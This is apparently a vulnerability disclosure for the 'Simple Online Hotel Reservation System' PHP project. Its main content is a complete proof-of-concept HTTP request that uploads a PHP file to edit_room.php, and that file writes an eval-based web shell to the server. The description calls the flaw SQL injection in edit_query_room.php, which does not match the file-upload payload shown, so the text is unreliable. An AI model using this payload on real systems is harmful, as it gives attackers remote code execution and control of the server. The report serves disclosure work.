# Simple Online Hotel Reservation System

## supplier 
https://code-projects.org/simple-online-hotel-reservation-system-in-php-with-source-code
## Vulnerability file
edit_query_room.php

## describe

**Code analysis**   

In the edit_query_room.php file of Simple Online Hotel Reservation System, theuser room_type parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

![image-2025](https://github.com/asd1238525/cve/blob/main/22c9b006-5d02-49e4-ba1e-7bac335953cd.png)


## POC

```
POST /simplehotel/HOR/admin/edit_room.php?room_id=6 HTTP/1.1
Host: 127.0.0.1:8083
Content-Length: 564
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8083
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3rmXUebO8u3rgGAS
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8083/simplehotel/HOR/admin/edit_room.php?room_id=6
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=s5o8pk3psueru08ci1jjc6b3if
Connection: close

------WebKitFormBoundary3rmXUebO8u3rgGAS
Content-Disposition: form-data; name="room_type"

Standard
------WebKitFormBoundary3rmXUebO8u3rgGAS
Content-Disposition: form-data; name="price"

1
------WebKitFormBoundary3rmXUebO8u3rgGAS
Content-Disposition: form-data; name="photo"; filename="12.php"
Content-Type: application/octet-stream

<?php fputs(fopen("shell.php", "w"), '<?php @eval($_POST["shell"]); ?>'); ?>
------WebKitFormBoundary3rmXUebO8u3rgGAS
Content-Disposition: form-data; name="edit_room"


------WebKitFormBoundary3rmXUebO8u3rgGAS--

```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/ff2c4ccf-bee3-4956-b50c-88aac96fb538.png)
Get payload:
![image-2025](https://github.com/asd1238525/cve/blob/main/82a80015-fbd5-4610-ad92-5b0354aaeed0.png)